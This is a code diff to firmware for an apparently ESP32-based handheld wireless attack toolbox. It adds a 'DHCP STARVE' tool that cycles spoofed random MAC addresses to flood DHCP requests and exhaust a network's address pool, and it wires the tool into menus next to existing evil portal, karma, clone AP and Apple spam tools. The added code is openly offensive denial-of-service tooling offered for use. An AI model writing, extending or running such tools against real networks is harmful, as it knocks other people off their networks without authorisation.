@@ -965,6 +965,65 @@ static void drawKarma(TFT_eSPI& t, uint32_t now) {
 }
 
 // =============================================================================
+//  DHCP STARVE — flood DHCP discover to exhaust address pool
+// =============================================================================
+static uint32_t s_dhcpSent = 0;
+static uint32_t s_dhcpLastMs = 0;
+
+// DHCP Discover packet template (UDP, broadcast)
+static void dhcpStarveStart() {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    s_dhcpSent = 0;
+    s_dhcpLastMs = 0;
+    Serial.println("[toolbox] DHCP starve started");
+}
+
+static void dhcpStarveTick() {
+    uint32_t now = millis();
+    if (now - s_dhcpLastMs < 10) return;
+    s_dhcpLastMs = now;
+
+    // Send DHCP discover as raw UDP broadcast on port 67
+    // We use WiFi.begin() with random MACs to generate real DHCP discovers
+    uint8_t mac[6];
+    mac[0] = 0xDE; mac[1] = random(0, 256); mac[2] = random(0, 256);
+    mac[3] = random(0, 256); mac[4] = random(0, 256); mac[5] = random(0, 256);
+    mac[0] &= 0xFE;  // unicast
+    mac[0] |= 0x02;  // locally administered
+    esp_wifi_set_mac(WIFI_IF_STA, mac);
+    WiFi.begin("DHCP_STARVE_TARGET");  // will fail but sends DHCP discover
+    delay(2);
+    WiFi.disconnect();
+    s_dhcpSent++;
+}
+
+static void drawDhcpStarve(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+    dhcpStarveTick();
+
+    t.setTextColor(Theme::RED, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("DHCP STARVE", w / 2, HEADER_H + 20, 4);
+
+    t.setTextColor(Theme::CYAN, Theme::BG);
+    t.drawString("Flooding DHCP requests", w / 2, HEADER_H + 55, 2);
+    t.drawString("with random MACs", w / 2, HEADER_H + 75, 2);
+
+    char buf[32];
+    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_dhcpSent);
+    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
+    t.drawString(buf, w / 2, h / 2 + 10, 7);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString("requests sent", w / 2, h / 2 + 50, 2);
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
 //  BLE SCAN
 // =============================================================================
 static const int MAX_BLE_RESULTS = 40;
@@ -1632,6 +1691,10 @@ static void stopActiveTool() {
         case ActiveTool::KARMA:
             karmaStop();
             break;
+        case ActiveTool::DHCP_STARVE:
+            WiFi.disconnect();
+            WiFi.mode(WIFI_OFF);
+            break;
         case ActiveTool::EVIL_PORTAL:
             evilPortalStop();
             break;
@@ -1679,6 +1742,7 @@ static void launchTool(ActiveTool tool) {
         case ActiveTool::RICKROLL:      rickrollStart();    break;
         case ActiveTool::EVIL_PORTAL:   evilPortalStart();  break;
         case ActiveTool::KARMA:         karmaStart();       break;
+        case ActiveTool::DHCP_STARVE:   dhcpStarveStart();  break;
         case ActiveTool::PROBE_SNIFF: probeSniffStart();  break;
         case ActiveTool::BLE_SCAN:    bleScanStart();     break;
         case ActiveTool::APPLE_SPAM:    appleSpamStart();   break;
@@ -1740,6 +1804,7 @@ static const char* headerForLevel(ToolboxLevel lvl) {
                 case ActiveTool::CLONE_AP:    return "CLONE AP";
                 case ActiveTool::EVIL_PORTAL: return "EVIL PORTAL";
                 case ActiveTool::KARMA:       return "KARMA";
+                case ActiveTool::DHCP_STARVE: return "DHCP STARVE";
                 case ActiveTool::PROBE_SNIFF: return "PROBE SNIFF";
                 case ActiveTool::BLE_SCAN:    return "BLE SCAN";
                 case ActiveTool::APPLE_SPAM:    return "APPLE SPAM";
@@ -1996,6 +2061,7 @@ void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
             case ActiveTool::CLONE_AP:    drawCloneAp(t, now);    break;
             case ActiveTool::EVIL_PORTAL: drawEvilPortal(t, now); break;
             case ActiveTool::KARMA:       drawKarma(t, now);      break;
+            case ActiveTool::DHCP_STARVE: drawDhcpStarve(t, now); break;
             case ActiveTool::PROBE_SNIFF: drawProbeSniff(t, now); break;
             case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
             case ActiveTool::APPLE_SPAM:    drawAppleSpam(t, now);      break;
@@ -2062,6 +2128,7 @@ static bool handleWifiTap(int idx) {
         case WifiTool::EVIL_PORTAL:    launchTool(ActiveTool::EVIL_PORTAL); break;
         case WifiTool::PROBE_SNIFF:    launchTool(ActiveTool::PROBE_SNIFF); break;
         case WifiTool::KARMA:          launchTool(ActiveTool::KARMA); break;
+        case WifiTool::DHCP_STARVE:    launchTool(ActiveTool::DHCP_STARVE); break;
         default:
             s_toolActive = true;
             s_activeTool = ActiveTool::NONE;
